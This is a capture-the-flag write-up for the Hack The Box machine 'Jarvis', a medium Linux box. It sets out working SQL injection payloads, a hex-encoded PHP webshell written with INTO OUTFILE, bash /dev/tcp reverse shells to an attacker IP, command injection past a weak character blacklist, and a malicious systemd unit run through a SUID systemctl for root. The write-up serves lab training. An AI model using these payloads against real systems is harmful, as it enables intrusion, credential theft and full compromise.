# Jarvis (HTB)

> Platform: Hack The Box  
> OS: Linux  
> Difficulty: Medium  
> Result: root

---

## Attack Chain

```text
Reconnaissance
├── nmap -sC -sV -p- jarvis.htb → 22 (SSH), 80 (Apache "Stark Hotel"), 64999 (Apache + fail2ban)
├── gobuster → /phpmyadmin/, /images/, /js/, /css/, /fonts/
└── /rooms-suites.php → links /room.php?cod=N

SQL Injection (manual, no sqlmap)
├── Boolean-based: cod=1 AND 1=1 (6204 b) vs cod=1 AND 1=2 (5916 b)
├── ORDER BY 1..7 → works, ORDER BY 8 → error → 7 columns
├── UNION SELECT: cod=-1 UNION SELECT 1,version(),3,4,5,6,7 → MariaDB 10.1.48
├── DB dump: information_schema.schemata → hotel, mysql, information_schema
├── Dump mysql.user: DBadmin:<MYSQL_HASH>
├── File_priv=Y, secure_file_priv='' → file writes allowed
└── hashcat -m 300 → <PASSWORD>

Foothold (RCE via INTO OUTFILE)
├── LOAD_FILE('/etc/apache2/sites-enabled/000-default.conf') → DocumentRoot: /var/www/html
├── INTO OUTFILE '/var/www/html/x.php' with hex of <?php system($_GET['x']); ?>
├── curl x.php?x=id → uid=33(www-data)
└── Reverse shell via bash + /dev/tcp → www-data

Lateral Movement (www-data → pepper)
├── sudo -l → (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
├── simpler.py: forbidden = ['&', ';', '-', '`', '||', '|']
├── Bypass via $() - command substitution is not blocked
├── /tmp/shell.sh: bash -c "bash -i >& /dev/tcp/10.10.14.177/4445 0>&1"
├── sudo -u pepper simpler.py -p → Enter an IP: $(/tmp/shell.sh)
└── Shell as pepper → user.txt

Privilege Escalation (pepper → root)
├── find / -perm -4000 → /bin/systemctl (SUID root:pepper)
├── cat /home/pepper/root.service (Type=oneshot, ExecStart=bash reverse shell)
├── /bin/systemctl link /home/pepper/root.service
├── /bin/systemctl start root.service
└── Root shell → cat /root/root.txt
```

> [!NOTE]
> All flags, passwords, hashes, and session tokens have been masked for ethical reasons.

---

## Machine Briefing

Apache 2.4.25 (Debian) on port 80 hosting "Stark Hotel" and an additional Apache on port 64999 (with fail2ban). An SQL injection in `room.php?cod=` allows writing files via `INTO OUTFILE`, yielding a webshell. Then - command injection in `simpler.py` to pivot to `pepper` and SUID `systemctl` for root.

---

## Reconnaissance

### Port Scan

```bash
nmap -p- --min-rate=5000 --max-retries 1 --defeat-rst-ratelimit -T4 -Pn -n jarvis.htb -oA scans/quick
nmap -sC -sV -Pn -n --open -p 22,80,64999 jarvis.htb -oA scans/detail
```

| Port  | Service | Version                              |
|-------|---------|--------------------------------------|
| 22    | SSH     | OpenSSH 7.4p1 Debian 10+deb9u6       |
| 80    | HTTP    | Apache httpd 2.4.25 (Debian) - Stark Hotel |
| 64999 | HTTP    | Apache httpd 2.4.25 (Debian) - fail2ban |

Port 64999 is protected by fail2ban - frequent requests block the IP for 90 seconds. **Do not touch it** to avoid losing access.

### Directory Enumeration

```bash
gobuster dir -u http://jarvis.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

| Path           | Status |
|----------------|--------|
| /phpmyadmin    | 301    |
| /images        | 301    |
| /js            | 301    |
| /css           | 301    |
| /fonts         | 301    |
| /server-status | 403    |

---

## Foothold (SQL Injection)

### Confirming the injection

```bash
curl -s -G "http://jarvis.htb/room.php" --data-urlencode "cod=1" | wc -c
# 6204

curl -s -G "http://jarvis.htb/room.php" --data-urlencode "cod=1 AND 1=1" | wc -c
# 6204

curl -s -G "http://jarvis.htb/room.php" --data-urlencode "cod=1 AND 1=2" | wc -c
# 5916 - difference → boolean-based SQLi
```

**Key point:** use `-G` + `--data-urlencode` so curl correctly encodes spaces (`%20`), `;` (`%3B`), `+` (`%2B`). Without this, the payload is truncated.

### Determining the number of columns

```bash
for i in 1 5 7 8 9; do
  size=$(curl -s -G "http://jarvis.htb/room.php" --data-urlencode "cod=1 ORDER BY $i" | wc -c)
  echo "ORDER BY $i → $size bytes"
done
```

- `ORDER BY 1..7` → 6204 bytes (success)
- `ORDER BY 8` → 5916 bytes (error)

**Conclusion: 7 columns.**

### UNION SELECT

```bash
curl -s -G "http://jarvis.htb/room.php" \
  --data-urlencode "cod=-1 UNION SELECT 1,CONCAT('START',version(),'END'),3,4,5,6,7-- -" \
  | grep -oE "START.*END"
```

**Result:** `START10.1.48-MariaDB-0+deb9u2END`.

### Dumping databases

```bash
curl -s -G "http://jarvis.htb/room.php" \
  --data-urlencode "cod=-1 UNION SELECT 1,GROUP_CONCAT(schema_name),3,4,5,6,7 FROM information_schema.schemata-- -" \
  | grep -oE "hotel|information_schema|mysql|performance_schema" | sort -u
```

### MySQL credentials

```bash
curl -s -G "http://jarvis.htb/room.php" \
  --data-urlencode "cod=-1 UNION SELECT 1,CONCAT(User,':',Password),3,4,5,6,7 FROM mysql.user WHERE User='DBadmin'-- -" \
  | grep -oE "DBadmin:\*[A-F0-9]+"
```

**Result:**

```
DBadmin:<MYSQL_HASH>
```

### Cracking the MySQL hash

```bash
echo '<MYSQL_HASH>' > hash.txt
hashcat -m 300 hash.txt /usr/share/wordlists/rockyou.txt
```

**Result:** `<PASSWORD>`.

### Checking FILE privilege

```bash
curl -s -G "http://jarvis.htb/room.php" \
  --data-urlencode "cod=-1 UNION SELECT 1,CONCAT('F:',File_priv,':E'),3,4,5,6,7 FROM mysql.user WHERE User='DBadmin'-- -"
```

**Result:** `F:Y:E` - FILE privilege present.

```bash
curl -s -G "http://jarvis.htb/room.php" \
  --data-urlencode "cod=-1 UNION SELECT 1,CONCAT('SEC:',@@secure_file_priv,':END'),3,4,5,6,7-- -"
```

**Result:** `SEC::END` - `secure_file_priv` is empty, can write anywhere.

---

## Exploitation (RCE via INTO OUTFILE)

No CVE (custom vulnerability) - SQL injection in the custom `room.php` endpoint (HTB-specific Stark Hotel app, no public CVE), chained with `INTO OUTFILE` to drop a PHP webshell into the web root.

### Determining the web root

```bash
curl -s -G "http://jarvis.htb/room.php" \
  --data-urlencode "cod=-1 UNION SELECT 1,LOAD_FILE('/etc/apache2/sites-enabled/000-default.conf'),3,4,5,6,7-- -"
```

Response contains: `DocumentRoot /var/www/html`.

### Testing file write

```bash
curl -s -G "http://jarvis.htb/room.php" \
  --data-urlencode "cod=-1 UNION SELECT 0x3c3f706870206563686f202848656c6c6f576f726c64293b203f3e,2,3,4,5,6,7 INTO OUTFILE '/var/www/html/test.php'-- -"

curl "http://jarvis.htb/test.php"
# HelloWorld    2    3    4    5    6    7
```

`INTO OUTFILE` **does not overwrite an existing file**. If you need a new one, use a different name.

### Webshell

```bash
curl -s -G "http://jarvis.htb/room.php" \
  --data-urlencode "cod=-1 UNION SELECT 0x3c3f7068702073797374656d28245f4745545b2778275d293b203f3e,2,3,4,5,6,7 INTO OUTFILE '/var/www/html/x.php'-- -"
```

Hex `3c3f7068702073797374656d28245f4745545b2778275d293b203f3e` = `<?php system($_GET['x']); ?>`.

Verification:

```bash
curl "http://jarvis.htb/x.php?x=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

### Reverse shell

```bash
# Kali
echo -n 'bash -i >& /dev/tcp/10.10.14.177/4444 0>&1' | base64 -w0
# YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNzcvNDQ0NCAwPiYx

# Listener
nc -lvnp 4444

# Sending through webshell (GET param, + for spaces, %2B for +)
curl -s "http://jarvis.htb/x.php?x=echo+YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC4xNzcvNDQ0NCAwPiYx+%7C+base64+-d+%7C+bash"
```

**Important:** in the URL, `+` must be encoded as `%2B`; otherwise the server interprets it as a space and base64 breaks.

### Stabilize

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## Lateral Movement (www-data → pepper)

### Enumeration

```bash
sudo -l
```

```
User www-data may run the following commands on jarvis:
    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
```

### Analyzing simpler.py

```bash
cat /var/www/Admin-Utilities/simpler.py
```

```python
def exec_ping():
    forbidden = ['&', ';', '-', '`', '||', '|']
    command = input('Enter an IP: ')
    for i in forbidden:
        if i in command:
            print('Got you')
            exit()
    os.system('ping ' + command)
```

**Key point:** the filter blocks `&`, `;`, `-`, `` ` ``, `||`, `|` but **does not block `$`, `(`, `)`**. So `$()` - command substitution - can be used.

**Important nuance:** `os.system` invokes `/bin/sh -c "..."` - on Debian this is **dash**, not bash. Dash **does not understand `>&`** - it outputs `Bad fd number`. So inside the script file, a `bash -c "..."` wrapper is needed (with **double** quotes, so dash passes the contents to bash without interpreting it).

### Preparing the script

```bash
echo 'bash -c "bash -i >& /dev/tcp/10.10.14.177/4445 0>&1"' > /tmp/shell.sh
chmod +x /tmp/shell.sh
cat /tmp/shell.sh
# bash -c "bash -i >& /dev/tcp/10.10.14.177/4445 0>&1"
```

### Listener

```bash
nc -lvnp 4445
```

### Exploit

```bash
sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
# Enter an IP: $(/tmp/shell.sh)
```

**Shell as `pepper`.**

### Stabilize

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

### User flag

```bash
cat /home/pepper/user.txt
# <USER_FLAG>
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

---

## Privilege Escalation (pepper → root)

### Enumeration

```bash
find / -perm -4000 -type f 2>/dev/null | grep systemctl
ls -la /bin/systemctl
```

**Result:**

```
-rwsr-x--- 1 root pepper 174520 Jun 29  2022 /bin/systemctl
```

SUID is set, owner `root`, group `pepper` - so `pepper` can run `systemctl` **with root privileges**.

### Creating a malicious unit

```bash
cat > /home/pepper/root.service << 'EOF'
[Unit]
Description=Root Shell

[Service]
Type=oneshot
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.177/4445 0>&1'

[Install]
WantedBy=multi-user.target
EOF
```

### Listener (second terminal)

```bash
nc -lvnp 4445
```

### Exploit

```bash
/bin/systemctl link /home/pepper/root.service
# Created symlink /etc/systemd/system/root.service -> /home/pepper/root.service.

/bin/systemctl start root.service
```

`systemctl link` is a legitimate command that allows attaching a unit file from any location, not only from `/etc/systemd/system/`. Via the SUID `systemctl`, we attach our unit and start it as root.

### Root shell

```bash
root@jarvis:/# id
uid=0(root) gid=0(root) groups=0(root)
```

### Root flag

```bash
cd /root
cat /root/root.txt
# <ROOT_FLAG>
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

---

## Flags

| Flag | Value                            |
|------|----------------------------------|
| User | <USER_FLAG> |
| Root | <ROOT_FLAG> |

---

## Key Takeaways

- **Manual SQLi without sqlmap** - boolean-based, ORDER BY, UNION SELECT. On the OSCP exam sqlmap is banned; everything is done by hand.
- **`INTO OUTFILE` does not overwrite the file** - a second write with the same name makes MariaDB return an error. Use a new name.
- **`os.system` in Python calls `sh` (dash), not bash** - `>&` does not work; a `bash -c "..."` wrapper with double quotes is needed.
- **Filters are often incomplete** - `forbidden = ['&', ';', '-', '`', '||', '|']` misses `$()`, opening command injection.
- **SUID `systemctl`** - a GTFOBins classic. `link` allows attaching a unit from anywhere, `start` runs it as root.
